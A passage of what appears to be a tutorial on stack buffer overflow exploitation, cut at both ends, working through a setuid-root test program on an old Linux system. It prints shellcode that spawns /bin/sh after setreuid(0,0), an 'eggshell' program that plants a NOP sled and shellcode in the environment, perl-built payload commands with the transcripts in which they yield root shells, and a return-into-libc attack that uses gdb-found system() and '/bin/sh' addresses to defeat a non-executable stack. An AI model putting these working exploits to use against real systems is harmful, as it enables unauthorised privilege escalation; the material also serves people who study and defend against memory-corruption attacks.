x46\x31\xdb\x31\xc9\xcd\x80"&nbsp;/*&nbsp;setreuid(0,0)&nbsp;*/<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"\x80\xe8\xdc\xff\xff\xff/bin/sh";<br/><br/><br/>unsigned&nbsp;long&nbsp;get_esp(void)&nbsp;{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__asm__("movl&nbsp;%esp,%eax");<br/>}<br/><br/>int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])&nbsp;{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*buff,&nbsp;*ptr,&nbsp;*egg;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;*addr_ptr,&nbsp;addr;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;offset=DEFAULT_OFFSET,&nbsp;bsize=DEFAULT_BUFFER_SIZE;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;i,&nbsp;eggsize=DEFAULT_EGG_SIZE;<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(argc&nbsp;&gt;&nbsp;1)&nbsp;bsize&nbsp;&nbsp;&nbsp;=&nbsp;atoi(argv[1]);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(argc&nbsp;&gt;&nbsp;2)&nbsp;offset&nbsp;&nbsp;=&nbsp;atoi(argv[2]);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(argc&nbsp;&gt;&nbsp;3)&nbsp;eggsize&nbsp;=&nbsp;atoi(argv[3]);<br/><br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!(buff&nbsp;=&nbsp;malloc(bsize)))&nbsp;{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Can't&nbsp;allocate&nbsp;memory.\n");<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!(egg&nbsp;=&nbsp;malloc(eggsize)))&nbsp;{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Can't&nbsp;allocate&nbsp;memory.\n");<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr&nbsp;=&nbsp;get_esp()&nbsp;-&nbsp;offset;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Using&nbsp;address:&nbsp;0x%x\n",&nbsp;addr);<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr&nbsp;=&nbsp;buff;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr_ptr&nbsp;=&nbsp;(long&nbsp;*)&nbsp;ptr;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;bsize;&nbsp;i+=4)<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(addr_ptr++)&nbsp;=&nbsp;addr;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ptr&nbsp;=&nbsp;egg;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;eggsize&nbsp;-&nbsp;strlen(shellcode)&nbsp;-&nbsp;1;&nbsp;i++)<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(ptr++)&nbsp;=&nbsp;NOP;<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;strlen(shellcode);&nbsp;i++)<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(ptr++)&nbsp;=&nbsp;shellcode[i];<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buff[bsize&nbsp;-&nbsp;1]&nbsp;=&nbsp;'\0';<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;egg[eggsize&nbsp;-&nbsp;1]&nbsp;=&nbsp;'\0';<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(egg,"EGG=",4);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;putenv(egg);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(buff,"RET=",4);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;putenv(buff);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system("/bin/bash");<br/>}<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;eggshell&nbsp;eggshell.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./eggshell<br/>Using&nbsp;address:&nbsp;0xbffff8f8<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\xf8\xf8\xff\xbf"x31'`<br/>Segmentation&nbsp;fault<br/><br/>When&nbsp;we&nbsp;'print&nbsp;"\xf8\xf8\xff\xbf"x31'(124&nbsp;bytes),&nbsp;we&nbsp;overwrite&nbsp;'buffer'&nbsp;and&nbsp;'ebp'<br/>but&nbsp;not&nbsp;'return&nbsp;address'&nbsp;yet.&nbsp;Do&nbsp;you&nbsp;remember&nbsp;how&nbsp;the&nbsp;stack&nbsp;of&nbsp;this&nbsp;vulnerable&nbsp;<br/>program&nbsp;looks&nbsp;like?&nbsp;It&nbsp;is&nbsp;as&nbsp;follows.&nbsp;<br/><br/>buffer(100&nbsp;bytes)&nbsp;-&nbsp;dummy(20&nbsp;bytes)&nbsp;-&nbsp;ebp(4&nbsp;bytes)&nbsp;-&nbsp;ret(4&nbsp;bytes)&nbsp;<br/><br/>As&nbsp;you&nbsp;can&nbsp;see,&nbsp;we&nbsp;need&nbsp;128&nbsp;bytes&nbsp;data&nbsp;to&nbsp;overwrite&nbsp;the&nbsp;return&nbsp;address.&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\xf8\xf8\xff\xbf"x32'`<br/>sh-2.05b#<br/><br/>I&nbsp;got&nbsp;a&nbsp;root&nbsp;shell.&nbsp;It&nbsp;is&nbsp;much&nbsp;easier&nbsp;than&nbsp;the&nbsp;first&nbsp;way&nbsp;of&nbsp;exploiting.&nbsp;This&nbsp;<br/>technique&nbsp;is&nbsp;quite&nbsp;helpful&nbsp;when&nbsp;a&nbsp;vulnerable&nbsp;program&nbsp;has&nbsp;small&nbsp;buffer,&nbsp;so&nbsp;we&nbsp;can't&nbsp;<br/>put&nbsp;shellcode&nbsp;directly&nbsp;into&nbsp;buffer&nbsp;like&nbsp;the&nbsp;first&nbsp;way.&nbsp;Let's&nbsp;take&nbsp;another&nbsp;example&nbsp;<br/>vul2.c.&nbsp;The&nbsp;size&nbsp;of&nbsp;memory&nbsp;allocated&nbsp;for&nbsp;the&nbsp;local&nbsp;variable&nbsp;is&nbsp;so&nbsp;small&nbsp;that&nbsp;we<br/>can't&nbsp;use&nbsp;the&nbsp;first&nbsp;classical&nbsp;way.<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;vul2.c<br/>int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buff[7];<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;strcpy(buff,&nbsp;argv[1]);<br/>&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br/>}<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;vul2&nbsp;vul2.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;su<br/>Password:<br/>[root@localhost&nbsp;bof]#&nbsp;./chogm<br/>Put&nbsp;the&nbsp;file&nbsp;name&nbsp;you&nbsp;want&nbsp;to&nbsp;chown&nbsp;and&nbsp;chmod:&nbsp;vul2<br/>[root@localhost&nbsp;bof]#&nbsp;su&nbsp;vangelis<br/>[vangelis@localhost&nbsp;bof]$&nbsp;ls&nbsp;-l&nbsp;vul2<br/>-rwsr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11353&nbsp;10&amp;#50900;&nbsp;5&nbsp;10:36&nbsp;vul2<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul2<br/>(gdb)&nbsp;disas&nbsp;main<br/>Dump&nbsp;of&nbsp;assembler&nbsp;code&nbsp;for&nbsp;function&nbsp;main:<br/>0x8048328&nbsp;&lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>0x8048329&nbsp;&lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%esp,%ebp<br/>0x804832b&nbsp;&lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x18,%esp&nbsp;&nbsp;<br/>0x804832e&nbsp;&lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;$0xfffffff0,%esp<br/>0x8048331&nbsp;&lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048336&nbsp;&lt;main+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;%eax,%esp<br/>0x8048338&nbsp;&lt;main+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;&nbsp;$0x8,%esp<br/>0x804833b&nbsp;&lt;main+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xc(%ebp),%eax<br/>0x804833e&nbsp;&lt;main+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x4,%eax<br/>0x8048341&nbsp;&lt;main+25&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;(%eax)<br/>0x8048343&nbsp;&lt;main+27&gt;:&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;0xffffffe8(%ebp),%eax<br/>0x8048346&nbsp;&lt;main+30&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%eax<br/>0x8048347&nbsp;&lt;main+31&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;0x8048268&nbsp;&lt;strcpy&gt;<br/>0x804834c&nbsp;&lt;main+36&gt;:&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;$0x10,%esp<br/>0x804834f&nbsp;&lt;main+39&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x0,%eax<br/>0x8048354&nbsp;&lt;main+44&gt;:&nbsp;&nbsp;&nbsp;&nbsp;leave&nbsp;&nbsp;<br/>0x8048355&nbsp;&lt;main+45&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x8048356&nbsp;&lt;main+46&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop&nbsp;&nbsp;&nbsp;&nbsp;<br/>0x8048357&nbsp;&lt;main+47&gt;:&nbsp;&nbsp;&nbsp;&nbsp;nop&nbsp;&nbsp;&nbsp;&nbsp;<br/>End&nbsp;of&nbsp;assembler&nbsp;dump.<br/>(gdb)&nbsp;q<br/>[vangelis@localhost&nbsp;bof]$<br/><br/>The&nbsp;stack&nbsp;looks&nbsp;like&nbsp;this:<br/><br/>buffer(16)&nbsp;-&nbsp;&nbsp;dummy(8)&nbsp;-&nbsp;ebp(4)&nbsp;-&nbsp;ret(4)<br/><br/>We&nbsp;need&nbsp;32&nbsp;bytes&nbsp;to&nbsp;overwrite&nbsp;the&nbsp;return&nbsp;address.&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul2&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"\xf8\xf8\xff\xbf"x8'`<br/>sh-2.05b#<br/><br/>I&nbsp;got&nbsp;a&nbsp;root&nbsp;shell!<br/><br/><br/><br/>3.&nbsp;Advanced&nbsp;Overflow&nbsp;Technique&nbsp;Under&nbsp;the&nbsp;Non-executable&nbsp;Stack<br/><br/>Now&nbsp;I&nbsp;will&nbsp;suggest&nbsp;more&nbsp;advanced&nbsp;techniques&nbsp;which&nbsp;can&nbsp;be&nbsp;used&nbsp;under&nbsp;executable&nbsp;<br/>stack&nbsp;and&nbsp;non-executable&nbsp;stack&nbsp;situation.&nbsp;Most&nbsp;of&nbsp;them&nbsp;are&nbsp;called&nbsp;"return-into-libc"<br/>technique.&nbsp;This&nbsp;technique&nbsp;was&nbsp;introduced&nbsp;to&nbsp;bypass&nbsp;the&nbsp;non-executable&nbsp;stack&nbsp;patch.<br/>If&nbsp;you&nbsp;read&nbsp;Nergal's&nbsp;"Advanced&nbsp;return-into-lib(c)&nbsp;exploits(PaX&nbsp;case&nbsp;Study)"<br/>(http://phrack.org/phrack/58/p58-0x04)&nbsp;you&nbsp;can&nbsp;find&nbsp;the&nbsp;introduction&nbsp;history&nbsp;of<br/>return-into-libc&nbsp;technique.&nbsp;Especially&nbsp;Nergal's&nbsp;article&nbsp;and&nbsp;the&nbsp;'Referenced&nbsp;<br/>publications&nbsp;and&nbsp;projects'&nbsp;will&nbsp;help&nbsp;you&nbsp;to&nbsp;understand&nbsp;return-into-libc&nbsp;technique.&nbsp;<br/>I&nbsp;also&nbsp;recommend&nbsp;you&nbsp;to&nbsp;read&nbsp;Nergal's&nbsp;article&nbsp;and&nbsp;other&nbsp;related&nbsp;ones.<br/><br/>From&nbsp;now&nbsp;on&nbsp;I&nbsp;will&nbsp;use&nbsp;the&nbsp;vul2&nbsp;as&nbsp;a&nbsp;target&nbsp;program&nbsp;of&nbsp;attack.<br/><br/><br/><br/>3.1.&nbsp;The&nbsp;"Classical"&nbsp;return-into-libc&nbsp;and&nbsp;Limitations&nbsp;of&nbsp;system()&nbsp;<br/><br/>The&nbsp;classical&nbsp;return-into-libc&nbsp;method&nbsp;is&nbsp;"most&nbsp;commonly&nbsp;used&nbsp;to&nbsp;evade&nbsp;protection&nbsp;<br/>offered&nbsp;by&nbsp;the&nbsp;non-executable&nbsp;stack.&nbsp;Instead&nbsp;of&nbsp;returning&nbsp;into&nbsp;code&nbsp;located&nbsp;within&nbsp;<br/>the&nbsp;stack,&nbsp;the&nbsp;vulnerable&nbsp;function&nbsp;should&nbsp;return&nbsp;into&nbsp;a&nbsp;memory&nbsp;area&nbsp;occupied&nbsp;by&nbsp;a&nbsp;<br/>dynamic&nbsp;library.&nbsp;It&nbsp;can&nbsp;be&nbsp;achieved&nbsp;by&nbsp;overflowing&nbsp;a&nbsp;stack&nbsp;buffer&nbsp;with&nbsp;the&nbsp;following&nbsp;<br/>payload."<br/><br/>--------------------------------------------------------------------------<br/>|&nbsp;data&nbsp;to&nbsp;overflow&nbsp;buffer&nbsp;|&nbsp;*system()&nbsp;|&nbsp;4&nbsp;bytes&nbsp;dummy&nbsp;data&nbsp;|&nbsp;*"/bin/sh"&nbsp;|<br/>--------------------------------------------------------------------------<br/><br/>We&nbsp;can&nbsp;easily&nbsp;get&nbsp;the&nbsp;address&nbsp;of&nbsp;system()&nbsp;by&nbsp;using&nbsp;gdb.&nbsp;And&nbsp;we&nbsp;can&nbsp;easily&nbsp;get&nbsp;the&nbsp;<br/>address&nbsp;of&nbsp;"/bin/sh"&nbsp;by&nbsp;using&nbsp;environment&nbsp;variable.&nbsp;Let's&nbsp;find&nbsp;out&nbsp;the&nbsp;address&nbsp;<br/>of&nbsp;system()&nbsp;first.&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;gdb&nbsp;-q&nbsp;vul2<br/>(gdb)&nbsp;b&nbsp;main<br/>Breakpoint&nbsp;1&nbsp;at&nbsp;0x804832e<br/>(gdb)&nbsp;r<br/>Starting&nbsp;program:&nbsp;/home/vangelis/test/bof/vul2<br/>/bin/bash:&nbsp;/root/.bashrc:&nbsp;Permission&nbsp;denied<br/>Breakpoint&nbsp;1,&nbsp;0x0804832e&nbsp;in&nbsp;main&nbsp;()<br/>(gdb)&nbsp;x/i&nbsp;system<br/>0x42041e50&nbsp;&lt;system&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%ebp<br/>(gdb)&nbsp;q<br/>The&nbsp;program&nbsp;is&nbsp;running.&nbsp;&nbsp;Exit&nbsp;anyway?&nbsp;(y&nbsp;or&nbsp;n)&nbsp;y<br/>[vangelis@localhost&nbsp;bof]$<br/><br/>I&nbsp;got&nbsp;the&nbsp;address&nbsp;of&nbsp;system():0x42041e50.&nbsp;Now&nbsp;I&nbsp;have&nbsp;to&nbsp;find&nbsp;out&nbsp;the&nbsp;address&nbsp;of&nbsp;"/bin/sh".&nbsp;<br/><br/>To&nbsp;get&nbsp;the&nbsp;address&nbsp;of&nbsp;"/bin/sh"&nbsp;I&nbsp;will&nbsp;use&nbsp;environmental&nbsp;variable.&nbsp;We&nbsp;will&nbsp;make&nbsp;an&nbsp;<br/>environmental&nbsp;variable&nbsp;hold&nbsp;the&nbsp;string&nbsp;"/bin/sh".&nbsp;So,&nbsp;I&nbsp;create&nbsp;an&nbsp;environmental&nbsp;<br/>variable&nbsp;called&nbsp;$WOWHACKER&nbsp;to&nbsp;store&nbsp;the&nbsp;string&nbsp;"/bin/sh".<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;export&nbsp;WOWHACKER="/bin/sh"<br/>[vangelis@localhost&nbsp;bof]$&nbsp;echo&nbsp;$WOWHACKER<br/>/bin/sh<br/>[vangelis@localhost&nbsp;bof]$&nbsp;env<br/>SSH_AGENT_PID=922<br/>HOSTNAME=localhost.localdomain<br/>PVM_RSH=/usr/bin/rsh<br/>TERM=xterm<br/>SHELL=/bin/bash<br/>HISTSIZE=1000<br/>JLESSCHARSET=ko<br/>GTK_RC_FILES=/etc/gtk/gtkrc:/root/.gtkrc-1.2-gnome2<br/>WINDOWID=23068815<br/>QTDIR=/usr/lib/qt3-gcc3.2<br/>USER=vangelis<br/>LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:&nbsp;[etc...]<br/>WOWHACKER=/bin/sh<br/>SSH_AUTH_SOCK=/tmp/ssh-XXNxttOD/agent.863<br/>PVM_ROOT=/usr/share/pvm3<br/>USERNAME=root<br/>SESSION_MANAGER=local/localhost.localdomain:/tmp/.ICE-unix/863<br/>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin<br/>MAIL=/var/spool/mail/root<br/>PWD=/home/vangelis/test/bof<br/>INPUTRC=/etc/inputrc<br/>XMODIFIERS=@im=Ami<br/>LANG=ko_KR.eucKR<br/>GDMSESSION=Default<br/>SSH_ASKPASS=/usr/libexec/openssh/gnome-ssh-askpass<br/>SHLVL=3<br/>HOME=/home/vangelis<br/>GNOME_DESKTOP_SESSION_ID=Default<br/>BASH_ENV=/root/.bashrc<br/>LOGNAME=vangelis<br/>LESSOPEN=|/usr/bin/lesspipe.sh&nbsp;%s<br/>DISPLAY=:0<br/>G_BROKEN_FILENAMES=1<br/>XAUTHORITY=/home/vangelis/.xauthj2VlJi<br/>COLORTERM=gnome-terminal<br/><br/>_=/bin/env<br/>[vangelis@localhost&nbsp;bof]$<br/><br/>Now&nbsp;I&nbsp;make&nbsp;a&nbsp;small&nbsp;but&nbsp;useful&nbsp;program&nbsp;get_env.c&nbsp;to&nbsp;get&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;<br/>environmental&nbsp;variable&nbsp;holding&nbsp;the&nbsp;string&nbsp;"/bin/sh".<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;cat&nbsp;&gt;&nbsp;get_env.c<br/>#include&nbsp;&lt;stdlib.h&gt;<br/>#include&nbsp;&lt;stdio.h&gt;<br/><br/>int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*addr;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr=getenv(argv[1]);<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Address&nbsp;of&nbsp;%s:&nbsp;%p\n",argv[1],addr);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br/>}<br/>[vangelis@localhost&nbsp;bof]$&nbsp;gcc&nbsp;-o&nbsp;get_env&nbsp;get_env.c<br/>[vangelis@localhost&nbsp;bof]$&nbsp;./get_env&nbsp;WOWHACKER<br/>Address&nbsp;of&nbsp;WOWHACKER:&nbsp;0xbffffd5c<br/><br/>The&nbsp;address&nbsp;of&nbsp;$WOWHACKER&nbsp;holding&nbsp;"/bin/sh"&nbsp;is&nbsp;0xbffffd5c.&nbsp;Now&nbsp;I&nbsp;get&nbsp;all&nbsp;<br/>information&nbsp;to&nbsp;exploit&nbsp;the&nbsp;vulnerable&nbsp;program&nbsp;vul2.&nbsp;<br/><br/>*&nbsp;address&nbsp;of&nbsp;system()&nbsp;-&nbsp;0x42041e50<br/>*&nbsp;address&nbsp;of&nbsp;$WOWHACKER&nbsp;-&nbsp;0xbffffd5c<br/><br/>Our&nbsp;exploit&nbsp;payload&nbsp;looks&nbsp;like&nbsp;the&nbsp;following.&nbsp;<br/><br/>--------------------------------------------------------------------------<br/>|&nbsp;data&nbsp;to&nbsp;overflow&nbsp;buffer&nbsp;|&nbsp;0x42041e50&nbsp;|&nbsp;4&nbsp;bytes&nbsp;dummy&nbsp;data&nbsp;|&nbsp;0xbffffd5c&nbsp;|<br/>--------------------------------------------------------------------------<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;./vul2&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"VANG"x7,"\x50\x1e\x04\x42","A"x4,"\x5c\xfd\xff\xbf"'`<br/>sh-2.05b$<br/><br/>I&nbsp;got&nbsp;a&nbsp;shell.&nbsp;But&nbsp;I&nbsp;couldn't&nbsp;get&nbsp;a&nbsp;root&nbsp;shell.&nbsp;Here&nbsp;we&nbsp;can&nbsp;know&nbsp;that&nbsp;there&nbsp;<br/>are&nbsp;some&nbsp;limitations&nbsp;in&nbsp;the&nbsp;classical&nbsp;return-into-libc&nbsp;technique.&nbsp;Negal&nbsp;said&nbsp;<br/>the&nbsp;two&nbsp;limitations&nbsp;in&nbsp;his&nbsp;article&nbsp;like&nbsp;the&nbsp;following.<br/><br/>1.&nbsp;It&nbsp;is&nbsp;impossible&nbsp;to&nbsp;call&nbsp;another&nbsp;function,&nbsp;which&nbsp;requires&nbsp;arguments,&nbsp;after&nbsp;function_in_lib.<br/>2.&nbsp;The&nbsp;arguments&nbsp;to&nbsp;function_in_lib&nbsp;cannot&nbsp;contain&nbsp;null&nbsp;bytes.<br/><br/>He&nbsp;told&nbsp;about&nbsp;the&nbsp;first&nbsp;limitation.&nbsp;"If&nbsp;a&nbsp;vulnerable&nbsp;application&nbsp;temporarily&nbsp;<br/>drops&nbsp;privileges&nbsp;(for&nbsp;example,&nbsp;a&nbsp;setuid&nbsp;application&nbsp;can&nbsp;do&nbsp;seteuid(getuid())),<br/>an&nbsp;exploit&nbsp;must&nbsp;regain&nbsp;privileges&nbsp;(with&nbsp;a&nbsp;call&nbsp;to&nbsp;setuid(something)&nbsp;usually)<br/>before&nbsp;calling&nbsp;system()."<br/><br/>Now,&nbsp;I&nbsp;will&nbsp;suggest&nbsp;the&nbsp;way&nbsp;to&nbsp;get&nbsp;over&nbsp;the&nbsp;limitations.<br/><br/><br/><br/>3.2.&nbsp;First&nbsp;Way&nbsp;To&nbsp;Get&nbsp;Over&nbsp;the&nbsp;'Classical'&nbsp;return-into-libc&nbsp;and&nbsp;system()<br/><br/>The&nbsp;first&nbsp;way&nbsp;to&nbsp;get&nbsp;over&nbsp;'classical'&nbsp;return-into-libc&nbsp;is&nbsp;to&nbsp;use&nbsp;setuid()&nbsp;with&nbsp;<br/>system().&nbsp;The&nbsp;vulnerable&nbsp;program&nbsp;vul2&nbsp;is&nbsp;setuid(0)&nbsp;set.&nbsp;So,&nbsp;we&nbsp;have&nbsp;to&nbsp;process&nbsp;<br/>the&nbsp;argument&nbsp;'0'&nbsp;of&nbsp;setuid()&nbsp;to&nbsp;get&nbsp;a&nbsp;root&nbsp;shell.&nbsp;If&nbsp;there&nbsp;is&nbsp;null&nbsp;byte&nbsp;before<br/>going&nbsp;to&nbsp;system(),&nbsp;we&nbsp;will&nbsp;fail&nbsp;to&nbsp;get&nbsp;a&nbsp;root&nbsp;shell.&nbsp;In&nbsp;order&nbsp;to&nbsp;solve&nbsp;this&nbsp;<br/>problem,&nbsp;we&nbsp;can&nbsp;use&nbsp;printf().<br/><br/>The&nbsp;first&nbsp;thing&nbsp;to&nbsp;use&nbsp;this&nbsp;technique&nbsp;is&nbsp;to&nbsp;add&nbsp;"/bin/sh"&nbsp;to&nbsp;the&nbsp;first&nbsp;list&nbsp;of<br/>environment.&nbsp;Let's&nbsp;see&nbsp;the&nbsp;list&nbsp;of&nbsp;environment&nbsp;variables&nbsp;by&nbsp;using&nbsp;env.&nbsp;<br/><br/>[vangelis@localhost&nbsp;bof]$&nbsp;env<br/>SSH_AGENT_PID=955<br/>HOSTNAME=localhost.localdomain<br/>PVM_RSH=/usr/bin/rsh<br/><br/>TERM=xterm<br/>SHELL=/bin/bash<br/>HISTSIZE=1000<br/>JLESSCHARSET=ko<br/>GTK_RC_FILES=/etc/gtk/gtkrc:/root/.gtkrc-1.2-gnome2<br/>WINDOWID=23068815<br/>QTDIR=/usr/lib/qt3-gcc3.2<br/>USER=vangelis<br/>LS_COLORS=no=00:fi=00:di=00;34:ln=00;36:pi=40;33:so=00;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:&nbsp;[etc...]<br/>SSH_AUTH_SOCK=/tmp/ssh-XXwZPnO4/agent.896<br/>PVM_ROOT=/usr/share/pvm3<br/>USERNAME=root<br/>SESSION_MANAGER=local/localhost.localdomain:/tmp/.ICE-unix/896<